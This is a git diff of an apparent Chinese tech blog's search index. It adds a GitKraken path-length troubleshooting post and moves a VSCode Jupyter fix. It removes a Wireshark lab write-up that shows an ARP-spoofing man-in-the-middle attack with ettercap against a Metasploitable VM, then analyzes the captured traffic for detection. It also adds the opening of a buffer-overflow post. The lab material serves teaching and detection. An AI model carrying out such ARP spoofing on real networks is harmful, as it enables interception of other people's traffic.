@@ -199,6 +199,61 @@ RSA、Elgamal、ECC等。</li>
       </tags>
   </entry>
   <entry>
+    <title>【GitKraken】 Could not find a compatible repository</title>
+    <url>/2020/05/01/GitKraken%20Error/</url>
+    <content><![CDATA[<h1>情况说明</h1>
+<p>有一天我用 GitKragen 打开我常用的仓库 Note，但发现有这样的报错：</p>
+<img src="/2020/05/01/GitKraken%20Error/image-20200501230732304.png" alt="image-20200501230732304" style="zoom:67%;">
+<p>之后用 GitKragen 始终打不开仓库 Notes 仓库。</p>
+<blockquote>
+<p>本文分析了可能出现此情况的所有可能，提出解决这个问题的方法，以及使用 GitKragen 的经验教训。</p>
+</blockquote>
+<a id="more"></a>
+<h1>原因分析</h1>
+<p>在 <a href="https://support.gitkraken.com/faq/" target="_blank" rel="noopener">https://support.gitkraken.com/faq/</a> 有专门这样一条：</p>
+<p><img src="/2020/05/01/GitKraken%20Error/clip_image001-1588345641404.png" alt></p>
+<p>翻译解释如下:</p>
+<ol>
+<li>当前的仓库被其他工具占用了，先把这些工具解除对仓库的占用，再尝试用 GitKragen 打开。</li>
+<li>尝试将仓库未解决的更改 stash ，或者提交，或者切换分支，再尝试用     GitKragen 打开。</li>
+<li>坑你是某个文件的完整路径过长，GitKragen 支持的最大的文件路径是 260 个字符。</li>
+</ol>
+<h1>尝试与解决</h1>
+<p>根据我当前的情况，第一个情况不可能，开始尝试第二个，同时在处理第二个的过程中注意第三个。<br>
+因为很可能是最近添加了路径过长的文件导致，在解决新的更改的时候可能发现那个文件。</p>
+<p>最开始并没有发现可特别疑的文件，顺利地把所有的文件提交了上去。之后发现 GitKragen 还是打不开仓库（排除了第二种情况）。</p>
+<p>尝试对最近看起来文件路径还是蛮长的文件进行了路径长度统计，但基本都不超过 150。<br>
+所以实在太奇怪了……（第三种情况也要排除了？）😵</p>
+<p>然而，在观察 Git History 的时候发现了神奇的事情：⭐️<img src="/2020/05/01/GitKraken%20Error/clip_image002.png" alt>发现之前提交了这个文件名巨长无比的文件？？<br>
+赶紧测试了一下：<br>
+<img src="/2020/05/01/GitKraken%20Error/clip_image003.png" alt></p>
+<p>逼近 260，有很大可能，然后发现这个文件原来的名称是“常用的输入字符的上标、下标、脚标.txt”<br>
+顿时懂了，这个含中文字符的文件名在 git 里面中文字符被 <code>\xxx</code> 来编码代替，而所谓的“文件路径是 260 个字符”是没有对 <code>\xxx</code> 解码的情况下测定的长度。<br>
+更改文件名，之后，GitKragen 果然恢复正常了…… ​😄​</p>
+<h1>经验教训</h1>
+<ol>
+<li>了解可能导致 GitKragen 打不开仓库的情况。</li>
+<li>在 Git 仓库里面
+<ol>
+<li>尽量不要让文件的层次太深（本案例没有太大这样的问题）</li>
+<li>文件命名在没有特殊需求的情况下使用英文字符（中文字符对 GitKragen 的字符长度规则里是 ×4 的，容易超过它的上限 260）</li>
+</ol>
+</li>
+</ol>
+<blockquote>
+<p>希望本文对也喜爱 GitKraken 的同仁能有点启示。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Development</category>
+        <category>Git</category>
+      </categories>
+      <tags>
+        <tag>GitKraken</tag>
+        <tag>Error</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VSCode Remote-SSH Kali 配置</title>
     <url>/2020/01/21/KaliSSH%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<img src="/2020/01/21/KaliSSH%E9%85%8D%E7%BD%AE/architecture-ssh.png" width="700">
@@ -395,143 +450,6 @@ openssl还包含了公钥私钥的生成、摘要生成等各种工具。</p>
       </tags>
   </entry>
   <entry>
-    <title>【GitKraken】 Could not find a compatible repository</title>
-    <url>/2020/05/01/GitKraken%20Error/</url>
-    <content><![CDATA[<h1>情况说明</h1>
-<p>有一天我用 GitKragen 打开我常用的仓库 Note，但发现有这样的报错：</p>
-<img src="/2020/05/01/GitKraken%20Error/image-20200501230732304.png" alt="image-20200501230732304" style="zoom:67%;">
-<p>之后用 GitKragen 始终打不开仓库 Notes 仓库。</p>
-<blockquote>
-<p>本文分析了可能出现此情况的所有可能，提出解决这个问题的方法，以及使用 GitKragen 的经验教训。</p>
-</blockquote>
-<a id="more"></a>
-<h1>原因分析</h1>
-<p>在 <a href="https://support.gitkraken.com/faq/" target="_blank" rel="noopener">https://support.gitkraken.com/faq/</a> 有专门这样一条：</p>
-<p><img src="/2020/05/01/GitKraken%20Error/clip_image001-1588345641404.png" alt></p>
-<p>翻译解释如下:</p>
-<ol>
-<li>当前的仓库被其他工具占用了，先把这些工具解除对仓库的占用，再尝试用 GitKragen 打开。</li>
-<li>尝试将仓库未解决的更改 stash ，或者提交，或者切换分支，再尝试用     GitKragen 打开。</li>
-<li>坑你是某个文件的完整路径过长，GitKragen 支持的最大的文件路径是 260 个字符。</li>
-</ol>
-<h1>尝试与解决</h1>
-<p>根据我当前的情况，第一个情况不可能，开始尝试第二个，同时在处理第二个的过程中注意第三个。<br>
-因为很可能是最近添加了路径过长的文件导致，在解决新的更改的时候可能发现那个文件。</p>
-<p>最开始并没有发现可特别疑的文件，顺利地把所有的文件提交了上去。之后发现 GitKragen 还是打不开仓库（排除了第二种情况）。</p>
-<p>尝试对最近看起来文件路径还是蛮长的文件进行了路径长度统计，但基本都不超过 150。<br>
-所以实在太奇怪了……（第三种情况也要排除了？）😵</p>
-<p>然而，在观察 Git History 的时候发现了神奇的事情：⭐️<img src="/2020/05/01/GitKraken%20Error/clip_image002.png" alt>发现之前提交了这个文件名巨长无比的文件？？<br>
-赶紧测试了一下：<br>
-<img src="/2020/05/01/GitKraken%20Error/clip_image003.png" alt></p>
-<p>逼近 260，有很大可能，然后发现这个文件原来的名称是“常用的输入字符的上标、下标、脚标.txt”<br>
-顿时懂了，这个含中文字符的文件名在 git 里面中文字符被 <code>\xxx</code> 来编码代替，而所谓的“文件路径是 260 个字符”是没有对 <code>\xxx</code> 解码的情况下测定的长度。<br>
-更改文件名，之后，GitKragen 果然恢复正常了…… ​😄​</p>
-<h1>经验教训</h1>
-<ol>
-<li>了解可能导致 GitKragen 打不开仓库的情况。</li>
-<li>在 Git 仓库里面
-<ol>
-<li>尽量不要让文件的层次太深（本案例没有太大这样的问题）</li>
-<li>文件命名在没有特殊需求的情况下使用英文字符（中文字符对 GitKragen 的字符长度规则里是 ×4 的，容易超过它的上限 260）</li>
-</ol>
-</li>
-</ol>
-<blockquote>
-<p>希望本文对也喜爱 GitKraken 的同仁能有点启示。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Development</category>
-        <category>Git</category>
-      </categories>
-      <tags>
-        <tag>GitKraken</tag>
-        <tag>Error</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Jupyter server crashed | VSCode + WLS</title>
-    <url>/2020/03/12/VSCode_Jupyter_bug/</url>
-    <content><![CDATA[<h1>情况分析</h1>
-<p>和往常一样，风平浪静☁️的一天，笔者打开 VSCode Remote WSL 之后，打开 Jupyter notebook，按下 <kbd>ctrl</kbd>+ <kbd>Enter</kbd> 运行代码，却得到了以下不寻常的通知和报错：</p>
-<img src="/2020/03/12/VSCode_Jupyter_bug/clip_image001-1584015261571.png" style="zoom:80%;">
-<center> 图 1</center>
-<p><img src="/2020/03/12/VSCode_Jupyter_bug/clip_image001-1584015274950.png" alt></p>
-<center> 图 2</center>
-<a id="more"></a>
-<h1>搜索引擎解决法</h1>
-<p>如果是往常，复制保存信息，扔到 Google 应该很快就能得到解决方案，遗憾的是，笔者这个奇葩罕见的 VSCode 的用法，注定了不能直接得到解决的方案。<br>
-VSCode GitHub 相关的 issue 看遍了，google 的基本看遍了、百度的可以看遍了，并没有可以直接的解决它的方法。😭</p>
-<h1>重新分析</h1>
-<h2 id="反思">反思</h2>
-<p>仔细看报错信息！！每个人的情况各异，搜索引擎不可能涵盖所有情况，你已经是个成熟的萌新了🌟 。<br>
-作为程序员，搜索引擎只是辅助手段，仅仅是收集信息中的一种手段。</p>
-<h2 id="波利亚解题法的启发">波利亚解题法的启发</h2>
-<blockquote>
-<p>参考自 <a href="https://www.jianshu.com/p/b55ec8de5968" target="_blank" rel="noopener">波利亚四步解题法</a></p>
-<p>波利亚的《怎样解题：数学思维的新方法》（How to Solve it: A New Aspect  of Mathematical Method)<br>
-1、彻底理解问题：为了确保真正理解问题，你最好把问题用自已的话换成各种形式反复重新表达，但另忘了指出问题的主干：要求解的是什么？已知什么？要满足哪些条件？但凡能画图，一定要画出来。<br>
-2、形成解题思路：要专注，用过往经验，已撑握的知识，并调整适用性来形成思路。如果不行，就改变这个问题的各个组件：已知、未知、条件，先构造简单一点的，引入辅助，条件是否用足，甚至改变求解的未知数，看能否找到解题线索？直到找到与之相似而你又解决过的问题。<br>
-3、执行：一要有耐心，二需要及时的检查每一步，可凭直觉或证明（两个都有用，但是两回事），要问自已每一步都检查了吗？能看出来这一步是对的吗？能证明这一步是对的吗？<br>
-4、总结：巩固与提升的关键，多想想，再论证，尝试另外的解法，找更明快简捷的方法，还要问，这次的解法还能用在什么地方？总结是最好的启法时刻。</p>
-</blockquote>
-<p>⭐️ 那我也简述一下自己一直以来的经验：</p>
-<ol>
-<li>遇到问题(bug)，要先尽可能收集信息，找出发生错误的各种可能的原因；</li>
-<li>把可能的原因序列，根据优先级排序，然后逐个尝试；</li>
-<li>总结归纳；</li>
-</ol>
-<h2 id="收集信息">收集信息</h2>
-<h3 id="信息一">信息一</h3>
-<p>运行时的报错信息：</p>
-<img src="/2020/03/12/VSCode_Jupyter_bug/image-20200312204521370.png" alt="image-20200312204521370" style="zoom:80%;">
-<p>仔细看报错信息，…/extensions/ms-python.python-2020.2.64367/…<br>
-应该是一个 ID 为 <code>ms-python.python</code> 的扩展<br>
-ms 很可能表示 Microsoft，所以这个扩展可能就是 Python，在扩展的信息中发现 Python 拓展 的 Extension-id 确实是 ms-python python</p>
-<img src="/2020/03/12/VSCode_Jupyter_bug/image-20200312204442296.png" alt="image-20200312204442296" style="zoom:50%;">
-<h3 id="信息二">信息二</h3>
-<p>一个月前这个插件还是能正常使用的，为什么这次就不行了？<br>
-可能的原因：</p>
-<ol>
-<li>本次开启的方式和期间有更改一些东西，后台有运行其他的什么等等</li>
-<li>版本不兼容问题（这个版本的）</li>
-</ol>
-<p>原因 1 探索的代价高、难度大，但是解决之后能始终使用最新的版本；<br>
-原因 2 操作简单，能够迅速应对现在的情景，并且我个人使用 WSL 对 Python 的插件的要求不高，更新也不太需要。</p>
-<h2 id="尝试">尝试</h2>
-<p>先尝试版本回退。</p>
-<img src="/2020/03/12/VSCode_Jupyter_bug/clip_image003.png" style="zoom:80%;">
-<p>很幸运的是，回退到一个月前的之后，Jupyter notebook 可以正常使用了。</p>
-<p>至于探索原因…… 综合考虑种种因素，不去触碰啦~（其实是大失败了）</p>
-<h2 id="后续">后续</h2>
-<p>为了防止 Python 扩展再次更新，取消 WSL 下的扩展的自动更新。<br>
-可以看到 defaultSettign.json （只读文件）中默认是自动更新的。</p>
-<img src="/2020/03/12/VSCode_Jupyter_bug/clip_image004.png" style="zoom: 50%;">
-<p>我们可以在设置中关闭它：</p>
-<img src="/2020/03/12/VSCode_Jupyter_bug/image-20200312201607696.png" alt="image-20200312201607696" style="zoom: 50%;">
-<p>或者在 <code>setting.json</code> 中添加一条 <code>“extensions.autoUpdate”: false</code></p>
-<img src="/2020/03/12/VSCode_Jupyter_bug/image-20200312201631390.png" alt="image-20200312201631390" style="zoom:67%;">
-<blockquote>
-<p>也许你会奇怪为什么 setting.json 中只有这么一点设置，而设置里面可以找到很多。<br>
-这是因为设置中的默认部分在 settign.json 里面不需要补充，只有用户需要额外添加的设置需要写在 setting.json 里面。</p>
-</blockquote>
-<blockquote>
-<p>最后感谢让我发现自己轻视 VSCode 扩展自动更新问题的 <code>syj</code> 😘</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Development</category>
-        <category>bug</category>
-      </categories>
-      <tags>
-        <tag>VSCode</tag>
-        <tag>Error</tag>
-        <tag>IDE</tag>
-        <tag>WSL</tag>
-        <tag>Jupyter notebook</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>libnum-error</title>
     <url>/2020/02/05/libnum-error/</url>
     <content><![CDATA[<p>由于之前清理空间的时候不慎将 WSL 的配置文件也误删掉了，所以慌忙还原 WSL 当初的配置，对于一些 Python 库的安装大多用 <code>pip</code> 的命令，直接安装，通过 <code>import ...</code> 的方式做一个简单的检查。但是前段时间在使用 <code>libnum</code> 的时候遇到了 <code>AttributeError: 'str' object has no attribute 'hex'</code> 的报错。</p>
@@ -577,8 +495,8 @@ ms 很可能表示 Microsoft，所以这个扩展可能就是 Python，在扩展
         <category>Crypto</category>
       </categories>
       <tags>
-        <tag>Crypto</tag>
         <tag>Error</tag>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -750,6 +668,88 @@ ms 很可能表示 Microsoft，所以这个扩展可能就是 Python，在扩展
       <tags>
         <tag>kali</tag>
         <tag>Wireshark</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jupyter server crashed | VSCode + WLS</title>
+    <url>/2020/03/12/VSCode_Jupyter_bug/</url>
+    <content><![CDATA[<h1>情况分析</h1>
+<p>和往常一样，风平浪静☁️的一天，笔者打开 VSCode Remote WSL 之后，打开 Jupyter notebook，按下 <kbd>ctrl</kbd>+ <kbd>Enter</kbd> 运行代码，却得到了以下不寻常的通知和报错：</p>
+<img src="/2020/03/12/VSCode_Jupyter_bug/clip_image001-1584015261571.png" style="zoom:80%;">
+<center> 图 1</center>
+<p><img src="/2020/03/12/VSCode_Jupyter_bug/clip_image001-1584015274950.png" alt></p>
+<center> 图 2</center>
+<a id="more"></a>
+<h1>搜索引擎解决法</h1>
+<p>如果是往常，复制保存信息，扔到 Google 应该很快就能得到解决方案，遗憾的是，笔者这个奇葩罕见的 VSCode 的用法，注定了不能直接得到解决的方案。<br>
+VSCode GitHub 相关的 issue 看遍了，google 的基本看遍了、百度的可以看遍了，并没有可以直接的解决它的方法。😭</p>
+<h1>重新分析</h1>
+<h2 id="反思">反思</h2>
+<p>仔细看报错信息！！每个人的情况各异，搜索引擎不可能涵盖所有情况，你已经是个成熟的萌新了🌟 。<br>
+作为程序员，搜索引擎只是辅助手段，仅仅是收集信息中的一种手段。</p>
+<h2 id="波利亚解题法的启发">波利亚解题法的启发</h2>
+<blockquote>
+<p>参考自 <a href="https://www.jianshu.com/p/b55ec8de5968" target="_blank" rel="noopener">波利亚四步解题法</a></p>
+<p>波利亚的《怎样解题：数学思维的新方法》（How to Solve it: A New Aspect  of Mathematical Method)<br>
+1、彻底理解问题：为了确保真正理解问题，你最好把问题用自已的话换成各种形式反复重新表达，但另忘了指出问题的主干：要求解的是什么？已知什么？要满足哪些条件？但凡能画图，一定要画出来。<br>
+2、形成解题思路：要专注，用过往经验，已撑握的知识，并调整适用性来形成思路。如果不行，就改变这个问题的各个组件：已知、未知、条件，先构造简单一点的，引入辅助，条件是否用足，甚至改变求解的未知数，看能否找到解题线索？直到找到与之相似而你又解决过的问题。<br>
+3、执行：一要有耐心，二需要及时的检查每一步，可凭直觉或证明（两个都有用，但是两回事），要问自已每一步都检查了吗？能看出来这一步是对的吗？能证明这一步是对的吗？<br>
+4、总结：巩固与提升的关键，多想想，再论证，尝试另外的解法，找更明快简捷的方法，还要问，这次的解法还能用在什么地方？总结是最好的启法时刻。</p>
+</blockquote>
+<p>⭐️ 那我也简述一下自己一直以来的经验：</p>
+<ol>
+<li>遇到问题(bug)，要先尽可能收集信息，找出发生错误的各种可能的原因；</li>
+<li>把可能的原因序列，根据优先级排序，然后逐个尝试；</li>
+<li>总结归纳；</li>
+</ol>
+<h2 id="收集信息">收集信息</h2>
+<h3 id="信息一">信息一</h3>
+<p>运行时的报错信息：</p>
+<img src="/2020/03/12/VSCode_Jupyter_bug/image-20200312204521370.png" alt="image-20200312204521370" style="zoom:80%;">
+<p>仔细看报错信息，…/extensions/ms-python.python-2020.2.64367/…<br>
+应该是一个 ID 为 <code>ms-python.python</code> 的扩展<br>
+ms 很可能表示 Microsoft，所以这个扩展可能就是 Python，在扩展的信息中发现 Python 拓展 的 Extension-id 确实是 ms-python python</p>
+<img src="/2020/03/12/VSCode_Jupyter_bug/image-20200312204442296.png" alt="image-20200312204442296" style="zoom:50%;">
+<h3 id="信息二">信息二</h3>
+<p>一个月前这个插件还是能正常使用的，为什么这次就不行了？<br>
+可能的原因：</p>
+<ol>
+<li>本次开启的方式和期间有更改一些东西，后台有运行其他的什么等等</li>
+<li>版本不兼容问题（这个版本的）</li>
+</ol>
+<p>原因 1 探索的代价高、难度大，但是解决之后能始终使用最新的版本；<br>
+原因 2 操作简单，能够迅速应对现在的情景，并且我个人使用 WSL 对 Python 的插件的要求不高，更新也不太需要。</p>
+<h2 id="尝试">尝试</h2>
+<p>先尝试版本回退。</p>
+<img src="/2020/03/12/VSCode_Jupyter_bug/clip_image003.png" style="zoom:80%;">
+<p>很幸运的是，回退到一个月前的之后，Jupyter notebook 可以正常使用了。</p>
+<p>至于探索原因…… 综合考虑种种因素，不去触碰啦~（其实是大失败了）</p>
+<h2 id="后续">后续</h2>
+<p>为了防止 Python 扩展再次更新，取消 WSL 下的扩展的自动更新。<br>
+可以看到 defaultSettign.json （只读文件）中默认是自动更新的。</p>
+<img src="/2020/03/12/VSCode_Jupyter_bug/clip_image004.png" style="zoom: 50%;">
+<p>我们可以在设置中关闭它：</p>
+<img src="/2020/03/12/VSCode_Jupyter_bug/image-20200312201607696.png" alt="image-20200312201607696" style="zoom: 50%;">
+<p>或者在 <code>setting.json</code> 中添加一条 <code>“extensions.autoUpdate”: false</code></p>
+<img src="/2020/03/12/VSCode_Jupyter_bug/image-20200312201631390.png" alt="image-20200312201631390" style="zoom:67%;">
+<blockquote>
+<p>也许你会奇怪为什么 setting.json 中只有这么一点设置，而设置里面可以找到很多。<br>
+这是因为设置中的默认部分在 settign.json 里面不需要补充，只有用户需要额外添加的设置需要写在 setting.json 里面。</p>
+</blockquote>
+<blockquote>
+<p>最后感谢让我发现自己轻视 VSCode 扩展自动更新问题的 <code>syj</code> 😘</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Development</category>
+        <category>bug</category>
+      </categories>
+      <tags>
+        <tag>Error</tag>
+        <tag>VSCode</tag>
+        <tag>IDE</tag>
+        <tag>WSL</tag>
+        <tag>Jupyter notebook</tag>
       </tags>
   </entry>
   <entry>
@@ -1128,123 +1128,118 @@ use more than 20~30% time to try;</p>
       </tags>
   </entry>
   <entry>
-    <title>【Wireshark 系列】中间人攻击分析</title>
-    <url>/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<p><img src="https://www.zer0-nu1l.com/uploads/Wireshark.jpg" alt="Wireshark"></p>
-<p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种非常高效（基本没有失败的可能）的攻击。<br>
-中间人攻击的目标并不是交换机，而是终端设备（例如计算机、手机等）。<br>
-所以我没有在上一篇 <a href="https://www.zer0-nu1l.com/2020/06/28/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91MAC%20%E5%9C%B0%E5%9D%80%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">【Wireshark 系列】MAC 地址泛洪攻击分析</a> 里面讲这部分的内容 😃</p>
-  <a id="more"></a>
-<h1>中间人攻击的相关理论</h1>
-<h2 id="ARP-缓存表-与-ARP报文分析">ARP 缓存表 与 ARP报文分析</h2>
-<p>在每一台终端设备中都有一个 ARP 缓存表，这个表中保存了一些 IP 地址和 MAC 地址之间的映射关系。<br>
-windows/Linunx 查看本台设备 ARP 表的命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>
-<p>删除 ARP 表的命令（需要管理员权限）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp -d</span><br></pre></td></tr></table></figure>
-<p>由于我们的电脑大部分时间都会和外进行通信，所以如果执行了删除 ARP 表的命令，它会很快进行ARP的请求，重新获得 Mac地址和 IP 的映射关系。</p>
-<p>我们可以利用这个特性，监听网卡，执行删除 ARP 表的命令，即可获得 ARP 请求和 ARP 响应的报文：<a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/ARP.pcapng" target="_blank" rel="noopener">ARP.pcapng</a>。</p>
-<h2 id="ARP-报文分析">ARP 报文分析</h2>
-<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175524589.png" alt="image-20200629175524589"></p>
-<p>ARP 报文非常非常简单，只有两个类型：一个 ARP 请求，一个 ARP 响应。<br>
-我们详细看下它的内容：</p>
-<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175539195.png" alt="image-20200629175539195"></p>
-<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175553893.png" alt="image-20200629175553893"></p>
-<p>Opcode 只有 1 和 2，1是请求，2是应答。<br>
-对应的，我们可以设置显示过滤器：arp.opcode == 2 或者 arp.opcode == 1<br>
-ARP 报文缺点：没有验证措施，所以容易伪造<br>
-由于 ARP 协议非常简单，所以在通信过程中 ARP 协议占比通常非常低，几乎可以忽略不计。如果占比高，很可能就是出现了异常情况。</p>
-<h2 id="ARP-欺骗">ARP 欺骗</h2>
-<p>ARP 欺骗是实现 MITM 攻击的一种常用手段。<br>
-可以网上似乎到处都是，而且计算机网络课程也应该提到过，这里就不再多少。</p>
-<h1>发起中间人攻击</h1>
-<h2 id="常见攻击方式">常见攻击方式</h2>
-<p>以前我们提到，ARP 协议没有验证措施，所以黑客可以冒充设备，甚至可以冒充网关……<br>
-一旦冒充了网关，目标主机就会将所有对外通信的报文给中间人，中间人再发给网关，信息一览无余……</p>
-<h2 id="情景介绍">情景介绍</h2>
-<p>下面使用 kali 虚拟机作为中间人攻击的实施者，Metasploitable 虚拟机作为被攻击的目标（为什么选他？因为它没有 GUI 省内存 😭）<br>
-虚拟机的网关为 192.168.93.2, Metasploitable 的 IP 是 192.168.93.145</p>
+    <title>【Wireshark 系列】缓冲区溢出攻击分析</title>
+    <url>/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/Wireshark.jpg" alt="Wireshark"></p>
+<p>前面介绍了很多种攻击方式，但是它们都是基于网络协议的缺陷。而在实际情况中，除了这些内容之外，操作系统和应用程序的漏洞也是网络安全研究的重点。<br>
+缓冲区溢出是现在很典型的一种远程攻击方式，它利用了程序员在编写程序时的疏忽，从而实现了在远程设备上执行代码。这些攻击方式大都要通过应用层的协议实现，所以本次课也会介绍应用层最为典型的协议 HTTP 。</p>
+<a id="more"></a>
+<h1>缓冲区溢出攻击的相关理论</h1>
+<p>缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出进行攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，攻击者可以利用它执行非授权指令，甚至可以取得系统特权，进而执行各种操作。</p>
+<p>考虑到目前大量的应用程序都使用了 B/S 结构，而这种结构正是使用 HTTP 协议进行通信的。</p>
+<p>维基百科的定义是：<br>
+缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p>
 <blockquote>
-<p>我暂居的地方马上迁移了，不要来毒化我哈 😅</p>
+<p>HTTP 协议下有一个 Host 字段，这个不是多余的，主要是虚拟化技术的发展，一台主机很可能对应多个域名。</p>
 </blockquote>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175611372.png" alt="image-20200629175611372" style="zoom:80%;">
-<h2 id="实施-ARP-攻击">实施 ARP 攻击</h2>
-<p>下面使用一款非常简单好用的工具 ettercap（实现 ARP 欺骗的工具很多，这是一款有 GUI 的工具）。<br>
-选择通用的嗅探：<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175628221.png" alt="image-20200629175628221"></p>
-<p>这时候多了很多选项：<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175723728.png" alt="image-20200629175723728"></p>
-<p>先进行扫描主机：<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175727750.png" alt="image-20200629175727750"></p>
-<p>然后查看 Hosts List<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175734405.png" alt="image-20200629175734405"></p>
-<p>分别选择两个目标（网关和攻击目标）<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175740006.png" alt="image-20200629175740006"></p>
-<p>然后执行 MITM<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175745093.png" alt="image-20200629175745093"></p>
-<p>之后这台机器于外界通信的数据包都会被我看到：<a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/MITM.pcapng" target="_blank" rel="noopener">MITM.pcapng</a></p>
-<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175807246.png" alt="image-20200629175807246"></p>
-<p><img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175810833.png" alt="image-20200629175810833"></p>
-<p>我们再做一件有趣的事情：我用 scp 从 WSL 发一张照片给 msfadmin</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp ./sydney.jpg msfadmin@192.168.93.145:~/</span><br></pre></td></tr></table></figure>
-<p>然后在 kali 追踪 TCP 流，看看能否得到图片<br>
-<a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/MITM_picture.pcapng" target="_blank" rel="noopener">MITM_picture.pcapng</a><br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175834142.png" alt="image-20200629175834142"></p>
-<p>SSH 经过了数据的加密，所以没有办法查看原来传输的数据。</p>
-<h1>分析中间人攻击</h1>
-<p>接下来我们将通过分析刚刚抓到的包，讲解 MITM 攻击的特点，以便我们自己在其他场景下判断、分辨 MAC 泛洪攻击。<br>
-<a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/MITM.pcapng" target="_blank" rel="noopener">MITM.pcapng</a></p>
-<h2 id="初看">初看</h2>
-<p>频繁出现 ARP 是不正常的（一般一应一答就结束了）<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175858516.png" alt="image-20200629175858516"></p>
-<p>协议分级看一下：<br>
-<img src="/2020/06/29/%E3%80%90Wireshark-%E7%B3%BB%E5%88%97%E3%80%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200629175903200.png" alt="image-20200629175903200"></p>
-<p>ARP 协议报文在这么大的数据包中，平常接近 0.0%，这里高达 8.6%！</p>
-<p>遇到这样情况，通常有三种可能：</p>
+<h1>模拟缓冲区溢出攻击</h1>
+<h2 id="实验环境">实验环境</h2>
+<blockquote>
